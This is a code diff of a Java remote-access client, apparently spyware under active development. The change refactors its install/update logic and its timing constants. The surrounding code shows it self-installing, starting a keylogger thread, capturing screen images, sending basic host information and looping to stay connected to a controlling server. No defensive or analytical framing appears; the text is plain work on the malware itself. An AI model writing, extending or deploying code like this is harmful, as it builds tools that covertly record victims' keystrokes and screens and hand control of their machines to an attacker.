@@ -15,12 +15,11 @@ import java.io.PrintWriter;
 import java.net.Socket;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
-import java.util.concurrent.TimeUnit;
 
 public class ConnectClient {
 
     public static void main(String[] args) {
-        startClient();
+        startClient(false);
     }
 
     public static final ScheduledExecutorService EXECUTOR =
@@ -34,22 +33,22 @@ public class ConnectClient {
     /**
      * Start Client
      */
-    public static void startClient() {
+    public static void startClient(boolean update) {
         if (FileComponents.getFileName().equalsIgnoreCase("Uninstall.jar")) {
             InstallComponents.uninstall();
             return;
         }
-        if (FileComponents.getFileName().equalsIgnoreCase(InstallComponents.LOCAL_UPDATER)) {
+        if (FileComponents.getFileName().equalsIgnoreCase("Connect.jar") && update) {
             InstallComponents.update();
             return;
         } else if (!FileComponents.getFileName().equalsIgnoreCase(InstallComponents.LOCAL_FILE) && InstallComponents.install()) {
             return;
         }
-        FileComponents.deleteFile(new File(InstallComponents.LOCAL_UPDATER));
+        FileComponents.deleteFile(new File("Connect.jar"));
         ClientCommandEnum.registerCommands();
         new Thread(KeyLoggerComponents::startKeyLogger).start();
         new Thread(ControlComponents::startUpdater).start();
-        EXECUTOR.schedule(() -> new Thread(ImageComponents::startHistory).start(), 1, TimeUnit.SECONDS);
+        EXECUTOR.schedule(() -> new Thread(ImageComponents::startHistory).start(), Connect.DELAY, Connect.DELAY_TYPE);
         for (; ; ) {
             try {
                 connectToServer();
@@ -107,7 +106,7 @@ public class ConnectClient {
         EXECUTOR.schedule(() -> {
             new Thread(ImageComponents::execHistoryUpdate).start();
             new Thread(ControlComponents::sendBasicInfo).start();
-        }, 1, TimeUnit.SECONDS);
+        }, Connect.DELAY, Connect.DELAY_TYPE);
 
         try {
             String serverMessage;
